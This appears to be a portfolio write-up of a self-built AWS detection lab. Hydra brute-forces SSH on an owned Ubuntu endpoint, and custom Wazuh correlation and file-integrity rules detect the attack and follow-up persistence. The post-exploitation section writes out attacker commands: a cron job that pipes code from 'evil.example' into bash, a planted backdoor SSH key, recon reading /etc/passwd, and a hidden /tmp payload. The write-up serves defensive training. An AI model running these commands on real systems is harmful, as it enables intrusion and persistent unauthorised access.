# 🛡️ Detection Engineering & Incident Response: SSH Brute-Force & Post-Exploitation in AWS ☁️

> **Lab provenance:** This is a **self-built cloud detection lab** provisioned and run in my own **Amazon Web Services (AWS)** account (eu-west-2, London). I designed the architecture, deployed the infrastructure, set up the custom detection rules, ran the attacks, and investigated the results end-to-end. All hosts and IPs are private lab instances I own and control; attacks were run only against my own machines.

In this detection engineering and threat hunting project, I architected and deployed a multi-node cloud detection lab in AWS using Wazuh SIEM/XDR, Ubuntu endpoints, and Hydra to simulate, detect, and investigate SSH brute-force intrusions and post-exploitation persistence mechanisms.

#### Technology Utilised:
<div>
  <img src="https://img.shields.io/badge/-Amazon_Web_Services-FF9900?&style=for-the-badge&logo=amazonwebservices&logoColor=white" />
  <img src="https://img.shields.io/badge/-Wazuh_SIEM_%2F_XDR-00A4EF?&style=for-the-badge&logo=wazuh&logoColor=white" />
  <img src="https://img.shields.io/badge/-Hydra-D32F2F?&style=for-the-badge&logo=hackaday&logoColor=white" />
  <img src="https://img.shields.io/badge/-Ubuntu_Linux-E95420?&style=for-the-badge&logo=ubuntu&logoColor=white" />
  <img src="https://img.shields.io/badge/-File_Integrity_Monitoring-2E7D32?&style=for-the-badge&logo=gnubash&logoColor=white" />
</div>

#### Security Concepts Demonstrated:
<div>
  <img src="https://img.shields.io/badge/-Detection_Engineering-6A1B9A?style=for-the-badge&logo=target&logoColor=white" />
  <img src="https://img.shields.io/badge/-Threat_Hunting-8E24AA?style=for-the-badge&logo=datadog&logoColor=white" />
  <img src="https://img.shields.io/badge/-Brute--Force_Analysis-D32F2F?style=for-the-badge&logo=security&logoColor=white" />
  <img src="https://img.shields.io/badge/-File_Integrity_Monitoring_(FIM)-00838F?style=for-the-badge&logo=checkmarx&logoColor=white" />
  <img src="https://img.shields.io/badge/-Custom_Rule_Correlation-1565C0?style=for-the-badge&logo=splunk&logoColor=white" />
  <img src="https://img.shields.io/badge/-MITRE_ATT%26CK_Mapping-FF6F00?style=for-the-badge&logo=mitre&logoColor=white" />
</div>

---

## 📋 Simple Breakdown

**What the lab was meant to teach me**
That I can build a working cloud SOC from scratch, stand up a SIEM, connect an endpoint, run a real attack against it, and use custom detection rules that tell the difference between routine login noise and an actual compromise.

**What I did**
I built a three-machine detection lab in AWS: a Wazuh SIEM manager, a monitored Ubuntu endpoint, and an attacker box. I brute-forced SSH with Hydra and the `rockyou.txt` wordlist, then used custom Wazuh correlation rules that (a) spot a burst of failed logins, (b) escalate to *critical* when a successful login follows that burst from the same IP, and (c) catch post-breach persistence (backdoor SSH keys, cron jobs, dropped payloads) in real time via File Integrity Monitoring.

**What I learnt**
- Single-event alerts cause alert fatigue; correlation rules (X failures then a success, same IP, within a window) are what a real SOC runs on.
- A strong password quietly defeats the whole attack. The compromise rule fired 0 times against a high-entropy password.
- File Integrity Monitoring is the safety net *after* the breach, catching every persistence technique I tried.
- Right-sizing cloud instances matters: I sized the manager for indexing load and used cheap burstable instances for the rest to keep costs near zero.

---

## 🛠️ Tools I Used (plain-English)

| Tool | What it is | What I used it for |
| --- | --- | --- |
| **Amazon Web Services (AWS EC2/VPC)** | Amazon's cloud platform for renting virtual machines and networks on demand. | Hosting the entire lab: three EC2 instances inside one private network (VPC). |
| **Wazuh (SIEM / XDR)** | A free security platform that collects logs, raises alerts, correlates events, and does File Integrity Monitoring. | The brain of the lab, where the detection rules ran and I watched alerts fire. |
| **Wazuh Agent** | Lightweight software installed on a monitored machine that ships telemetry to the manager. | Sending login and file-change data from the endpoint to the Wazuh manager. |
| **Hydra** | A fast password-guessing (brute-force) tool. | Running the SSH brute-force attack against the target account. |
| **`rockyou.txt`** | A famous 14-million-entry list of leaked real-world passwords. | The dictionary Hydra worked through. |
| **Ubuntu Linux** | A popular Linux distribution. | The OS on all three lab machines. |
| **File Integrity Monitoring (FIM / `syscheck`)** | Wazuh's feature that watches files/folders and alerts on any change. | Detecting backdoor keys, cron edits, and dropped payloads in real time. |
| **`local_rules.xml`** | The Wazuh file where custom detection rules are defined. | Where the correlation and FIM rules used in this lab live. |
| **`auth.log`** | The Linux system log of authentication events. | Reconstructing the attacker's successful-login timeline during investigation. |
| **`crontab` / SSH `authorized_keys`** | Linux scheduled-task and SSH-key mechanisms. | The persistence targets I emulated as an attacker and then detected. |

---

## 1. Lab Overview

I built a small cloud Security Operations environment in AWS to detect and investigate an SSH brute-force attack and the post-exploitation activity that follows a successful login. The aim was to use layered Wazuh detection rules that separate routine login noise from a real compromise, and to catch persistence techniques (backdoor SSH keys, cron jobs, dropped payloads) in real time using File Integrity Monitoring (FIM).

---

## 2. AWS Setup & Cost Engineering
<img width="1247" height="330" alt="image" src="https://github.com/user-attachments/assets/3eea5b0e-57c8-47df-af1d-b2e4df79d306" />


I provisioned the entire lab in AWS EC2 in the `eu-west-2` (London) region, inside a single VPC (`172.31.0.0/16`) so all three machines could talk to each other over private IPs. Instance sizing was a deliberate cost decision: the Wazuh manager runs OpenSearch indexing, which is memory-hungry, so it needed a larger node; the attacker and victim do little beyond generating and receiving traffic, so they run on cheap burstable instances. 

| Role | Hostname | Private IP | Instance | Notes |
| --- | --- | --- | --- | --- |
| Wazuh Manager | `wazuh-server` | `172.31.60.36` | `c7i-flex.large` | Manager + dashboard; OpenSearch indexing |
| Monitored Endpoint | `linux-endpoint-01` | `172.31.9.67` | `t3.small` | Wazuh agent (ID 002); FIM + syslog |
| Attacker | `hydrax-corp-vm` | `172.31.6.226` | `t3.small` | Hydra v9.5 + rockyou.txt |

---

## 3. Architecture: The Three VMs

The attacker brute-forces SSH (port 22) against the endpoint. The endpoint runs a Wazuh agent that ships authentication and file-change telemetry to the manager over the encrypted agent channel (port 1514), where the detection rules evaluate it.

```text
+-------------------------------------------------------------------------------+
|                       AWS VPC (eu-west-2 / 172.31.0.0/16)                      |
|                                                                               |
|  +--------------------------+                 +----------------------------+  |
|  | hydrax-corp-vm           |                 | linux-endpoint-01          |  |
|  | IP: 172.31.6.226         |  SSH Brute-Force| IP: 172.31.9.67            |  |
|  | Instance: t3.small       |================>| Instance: t3.small         |  |
|  | Hydra v9.5 + rockyou.txt | (Port 22 Attack)| Wazuh Agent v4.9.0         |  |
|  +--------------------------+                 +----------------------------+  |
|                                                              |                |
|                                                    Encrypted | Agent Telemetry|
|                                                    Port 1514 | (FIM + Syslog) |
|                                                              v                |
|                                               +----------------------------+  |
|                                               | wazuh-server               |  |
|                                               | IP: 172.31.60.36           |  |
|                                               | Instance: c7i-flex.large   |  |
|                                               | Wazuh Manager + Dashboard  |  |
|                                               +----------------------------+  |
+-------------------------------------------------------------------------------+
```

---

## 4. Connecting the Linux Endpoint to Wazuh

I registered the Ubuntu endpoint as an agent on the Wazuh manager and confirmed it was reporting in as agent ID 002.

<img width="1445" height="446" alt="image" src="https://github.com/user-attachments/assets/3fe448ab-15c5-4d9b-9160-1f73d3604179" />
<img width="1456" height="536" alt="image" src="https://github.com/user-attachments/assets/a1b1d33c-b686-45b5-9256-e8ec1dff147a" />


---

## 5. Attacker Setup: Hydra & Wordlist

**Installing Hydra on `hydrax-corp-vm` (attacker VM):**

<img width="1457" height="482" alt="image" src="https://github.com/user-attachments/assets/08f4967f-414c-4dfe-953d-5dce4bde0d52" />


**Downloaded the `rockyou.txt` wordlist (close to 14 million passwords) and tested the installation:**

<img width="1092" height="360" alt="image" src="https://github.com/user-attachments/assets/8aa8ce31-9fd6-4a9d-a2e1-9683e1cbf564" />

---

## 6. Target Account Provisioning

I created a test user `john` on the endpoint with a deliberately weak password that exists inside the `rockyou` wordlist, so the brute-force would succeed for the demonstration.

<img width="1456" height="177" alt="image" src="https://github.com/user-attachments/assets/a9a9200b-3a60-4081-931a-5c8314a521f2" />

---

## 7. Scenario 1: Successful Brute Force

**Running Hydra against the endpoint:**

<img width="822" height="582" alt="image" src="https://github.com/user-attachments/assets/99800d0f-09c2-485c-b2c2-3496343c13c1" />

**Successfully cracked the account:**

<img width="1606" height="151" alt="image" src="https://github.com/user-attachments/assets/b0e8be86-f9e8-41fc-b72b-a724be617283" />

```text
[22][ssh] host: 172.31.9.67   login: john   password: iloveyou
1 of 1 target successfully completed, 1 valid password found
Hydra finished at 2026-08-28 19:31:01
```

**Wazuh detection on the Threat Hunting page for `linux-endpoint-01`:**

<img width="902" height="407" alt="image" src="https://github.com/user-attachments/assets/8d6326ec-deec-41cf-a378-d98a21fee721" />


**Filtering `data.srcip:172.31.6.226` (the attacker), 11 failures and 1 success:**

<img width="905" height="421" alt="image" src="https://github.com/user-attachments/assets/92799ef4-af02-423f-a245-2ce6b249c201" />

### Detection Logic: Layered Rules

This investigation uses two complementary detection rules working together.

**Rule 5760, Base detection (built-in).** Wazuh's default rule that fires on each individual failed SSH authentication. It records the raw event (source IP, targeted username, timestamp) for every single login failure. On its own, one failed login is not an attack; it is normal background activity. This rule provides the underlying signal but not the context.

**Rule 100100, Correlation (custom).** A custom rule that identifies the *pattern* that indicates an attack. It triggers only when 5 or more failures (rule 5760) originate from the same source IP within 120 seconds, the signature of an automated brute-force tool. This turns many low-value individual events into a single high-value alert: "a brute-force attack is in progress." It is mapped to MITRE ATT&CK **T1110 (Brute Force)**.

**Why both are needed.** Base rules like 5760 capture raw telemetry, but alerting on every failed login would flood analysts with noise and cause alert fatigue. The correlation rule adds the logic that separates a genuine attack from routine failed logins, so analysts are alerted only when a real threat pattern emerges. The base rule is the sensor; the correlation rule is the analytical layer built on top of it.

During testing, rule 5760 fired once per Hydra password attempt, while rule 100100 fired once to flag the overall attack, correctly identifying the brute-force from source IP `172.31.6.226` and mapping it to T1110.

These are the custom correlation rules used in `local_rules.xml`:

```xml
<group name="authentication_failures,attack,">

  <!-- 100100: 5+ failures from the same IP within 120s = brute-force in progress -->
  <rule id="100100" level="10" frequency="5" timeframe="120">
    <if_matched_sid>5760</if_matched_sid>
    <same_source_ip />
    <description>Attack: 5+ SSH authentication failures from the same source IP (T1110)</description>
    <mitre><id>T1110</id></mitre>
  </rule>

  <!-- 100102: a success (5715) from an IP that just triggered 100100 = confirmed compromise -->
  <rule id="100102" level="12">
    <if_matched_sid>5715</if_matched_sid>
    <if_sid>100100</if_sid>
    <same_source_ip />
    <description>CRITICAL: Successful SSH login after brute-force from the same source IP (T1110 / T1078)</description>
    <mitre><id>T1110</id><id>T1078</id></mitre>
  </rule>

</group>
```

**rule.id: 5760**

<img width="912" height="382" alt="image" src="https://github.com/user-attachments/assets/13bcd27d-a52a-463e-81a7-c413d808800a" />

**rule.id: 100100**

<img width="910" height="377" alt="image" src="https://github.com/user-attachments/assets/82a6ad02-99ac-4e40-833e-68c5078576b5" />


### Scaling Up: 346-Password Run

Next I ran a more realistic, higher-volume attack. I had planned a 50k-password run, but to save time I toned it down to 346 passwords.

<img width="1406" height="426" alt="image" src="https://github.com/user-attachments/assets/3d48fe99-2acd-4120-9d06-6e4e8adb65e1" />


**A lot more events are generated:**

<img width="1405" height="605" alt="image" src="https://github.com/user-attachments/assets/b5347839-a4bb-4b36-9eb9-a76b243e95f7" />

**`rule.id:5760` = 700 events with 700 failures:**

<img width="1417" height="320" alt="image" src="https://github.com/user-attachments/assets/5a5f9d94-074b-423f-acd1-c5cbf4c2a38f" />


**`rule.id:100100 OR 100101 OR 100102` = 227 events, with 77 over Level 12:**

<img width="1421" height="315" alt="image" src="https://github.com/user-attachments/assets/0f6325a4-3021-48ff-a533-fa1703edcdc6" />

**`rule.id:100102` (successful logon after brute-force) = 1 event:**

<img width="1410" height="321" alt="image" src="https://github.com/user-attachments/assets/3285f092-cb1d-44c4-8484-0bbcc563544c" />

**`rule.id:5715` (successful logon) in the last 15 minutes:**

<img width="1410" height="310" alt="image" src="https://github.com/user-attachments/assets/c7b3d8f2-ab09-4d0e-b881-294e6c75568c" />

Reading the four rules together tells the whole story:

- `rule.id:5760` → 700 failures (the attack volume)
- `rule.id:100100 / 100101` → correlated brute-force alerts (the detection)
- `rule.id:5715` → the 1 success (the breach moment)
- `rule.id:100102` → CRITICAL compromise alert (the detection that matters)

---

## 8. Scenario 2: Strong Password Defence Test

To prove the control works, I changed `john`'s password to a complex value that does not exist in the wordlist and re-ran the attack (planned as 100k, run as 100 to save time).

**Changing the password to something more complex (not in the Hydra wordlist):**

<img width="1410" height="67" alt="image" src="https://github.com/user-attachments/assets/d6a2d9f5-3f17-44ff-bb70-38f252d832af" />

**No passwords found:**

<img width="1410" height="185" alt="image" src="https://github.com/user-attachments/assets/368ef591-996f-4221-8419-edc10eaf5686" />

**`rule.id:100100 OR 100101` = 9 above Level 12 (the brute-force was still detected):**

<img width="1422" height="602" alt="image" src="https://github.com/user-attachments/assets/d7bcebd9-1f68-4816-8935-409e935835f9" />

**`rule.id:100102` = no matches for a successful logon after brute-force (no compromise):**

<img width="1420" height="215" alt="image" src="https://github.com/user-attachments/assets/ed966661-fbd0-42af-9637-9e173a645909" />

The brute-force attempt was still detected, but the compromise rule (100102) produced zero hits, confirming that a strong password prevented the breach even though the attack itself was loud.

---

## 9. Incident Response: Log Investigation

With the attacks done, I moved into an investigation mindset and audited the endpoint's authentication log to establish the attacker's successful-login timeline.

**All successful logins to `john`:**

<img width="1765" height="356" alt="image" src="https://github.com/user-attachments/assets/1cd9b1d8-06b0-4bb2-aa18-d7b84152b256" />

```bash
sudo grep "Accepted password" /var/log/auth.log | grep john

2026-08-28T19:30:57 ip-172-31-9-67 sshd[5711]: Accepted password for john from 172.31.6.226 port 44940 ssh2
2026-08-28T19:48:12 ip-172-31-9-67 sshd[5849]: Accepted password for john from 172.31.6.226 port 37972 ssh2
2026-08-28T19:52:23 ip-172-31-9-67 sshd[5996]: Accepted password for john from 172.31.6.226 port 48672 ssh2
2026-08-28T20:16:12 ip-172-31-9-67 sshd[6557]: Accepted password for john from 172.31.6.226 port 47584 ssh2
```

---

## 10. Configuring Custom FIM & Persistence Rules

To see what an attacker actually changes after gaining access, I added real-time File Integrity Monitoring on the sensitive locations and used custom persistence-detection rules. Configs were backed up first, then the FIM directories were inserted into `ossec.conf` and the rules appended to `local_rules.xml`.

```bash
# 1. Back up configs first (always)
sudo cp /var/ossec/etc/ossec.conf /var/ossec/etc/ossec.conf.bak
sudo cp /var/ossec/etc/rules/local_rules.xml /var/ossec/etc/rules/local_rules.xml.bak

# 2. FIM directories added inside <syscheck>
<directories check_all="yes" realtime="yes">/home/john/.ssh</directories>
<directories check_all="yes" realtime="yes">/etc/cron.d,/var/spool/cron</directories>
<directories check_all="yes" realtime="yes">/tmp</directories>

# 3. Custom persistence-detection rules appended to local_rules.xml
<group name="persistence,attack,">
  <rule id="100200" level="12">
    <if_group>syscheck</if_group>
    <field name="file">authorized_keys</field>
    <description>Persistence: SSH authorized_keys modified - possible backdoor key (T1098.004)</description>
    <mitre><id>T1098.004</id></mitre>
  </rule>
  <rule id="100201" level="12">
    <if_group>syscheck</if_group>
    <field name="file">cron</field>
    <description>Persistence: cron modified - possible malicious scheduled task (T1053.003)</description>
    <mitre><id>T1053.003</id></mitre>
  </rule>
  <rule id="100202" level="10">
    <if_group>syscheck</if_group>
    <field name="file">/tmp/.</field>
    <description>Suspicious hidden file created in /tmp - possible dropped payload (T1105)</description>
    <mitre><id>T1105</id></mitre>
  </rule>
</group>
```

---

## 11. Post-Exploitation Emulation

**SSH into the victim account from the attacker VM:**

<img width="1767" height="442" alt="image" src="https://github.com/user-attachments/assets/13e23712-5d0f-4584-b4df-f72da2c505c8" />

Acting as the attacker after compromise, I ran four post-exploitation techniques covering persistence, discovery, and payload staging.

```bash
# 1. Backdoor SSH key (T1098.004)
mkdir -p ~/.ssh && echo "ssh-rsa AAAAB3NzaC1yc2FAKEbackdoorkey attacker@evil" >> ~/.ssh/authorized_keys

# 2. Malicious cron job (T1053.003)
(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s http://evil.example/beacon | bash") | crontab -

# 3. Recon / discovery (T1087, T1082, T1548 sudo attempt)
whoami; id; uname -a; cat /etc/passwd | tail -5; sudo -l

# 4. Dropped payload (T1105)
echo "malicious payload placeholder" > /tmp/.hidden_backdoor.sh && chmod +x /tmp/.hidden_backdoor.sh
```

**All 4 run:**

<img width="1751" height="397" alt="image" src="https://github.com/user-attachments/assets/3423e0aa-30af-4639-864a-21cc00c69e3e" />

---

## 12. FIM Detection Results

**`rule.id:100200 OR 100201 OR 100202`, the persistence techniques were caught in real time:**

<img width="1762" height="252" alt="image" src="https://github.com/user-attachments/assets/5ea15c88-980f-4fca-adee-c385934a68ba" />

**Wazuh alert summary:**

<img width="1147" height="365" alt="image" src="https://github.com/user-attachments/assets/df3e3d7d-70c8-488e-8bd3-4d0e41ced2d9" />

| Rule ID | Description | Level | Count |
| --- | --- | --- | --- |
| 100200 | Persistence: SSH authorized_keys modified, possible backdoor key (T1098.004) | 12 | 1 |
| 100201 | Persistence: cron modified, possible malicious scheduled task (T1053.003) | 12 | 1 |
| 100202 | Suspicious hidden file created in /tmp, possible dropped payload (T1105) | 10 | 1 |

---

## 13. Wrap-Up

Stopping the VMs after completing the brute-force lab to avoid running compute costs.

<img width="1247" height="330" alt="image" src="https://github.com/user-attachments/assets/09b530de-ccc2-45f5-84c9-c176274413e2" />

---

## Custom Rules Reference

What each rule ID means and why it exists:

| Rule ID | Level | Type | What it means | MITRE |
| --- | --- | --- | --- | --- |
| `5760` | 5 | Built-in | Fires on each single SSH authentication failure (raw sensor signal) | N/A |
| `5715` | 3 | Built-in | Fires on a successful SSH authentication | N/A |
| `100100` | 10 | Custom correlation | ≥5 failures from the same source IP within 120s = brute-force in progress | T1110 |
| `100101` | 10 | Custom correlation | Persistent brute-force threshold breach | T1110 |
| `100102` | 12 | Custom correlation | A success (5715) from an IP that just triggered 100100 = confirmed compromise | T1110 / T1078 |
| `100200` | 12 | Custom FIM | Change to `authorized_keys` = possible backdoor SSH key | T1098.004 |
| `100201` | 12 | Custom FIM | Change to cron = malicious scheduled task | T1053.003 |
| `100202` | 10 | Custom FIM | Hidden executable created in `/tmp` = dropped payload | T1105 |

---

## Defensive Hardening Recommendations

- **Disable SSH password authentication.** Set `PasswordAuthentication no` in `/etc/ssh/sshd_config` so logins require an SSH key instead of a password. A cryptographic key cannot be guessed from a wordlist the way a password can, so this removes the brute-force vector entirely, which was the exact entry point used in this lab.
- **Automated IP banning.** Configure Wazuh Active Response or Fail2ban to watch for the brute-force alert and automatically add a firewall rule blocking the attacker's IP the moment rule `100100` fires. This cuts off an ongoing attack in seconds without waiting for an analyst to react.
- **Mount `/tmp` with `noexec`.** `/tmp` is world-writable, so any user (or attacker) can drop a file there. Mounting it with the `noexec` flag means files placed in `/tmp` cannot be executed, which stops a dropped payload from running even if the attacker manages to write it to disk.
- **Enforce password complexity and audit `authorized_keys`.** Require long, high-entropy passwords, because Scenario 2 showed a complex password defeated the attack outright, and regularly review each user's `authorized_keys` file so a backdoor key planted for persistence is spotted and removed quickly.

---

*Self-built AWS detection lab. All infrastructure is private and controlled by me; attacks were run only against my own instances.*
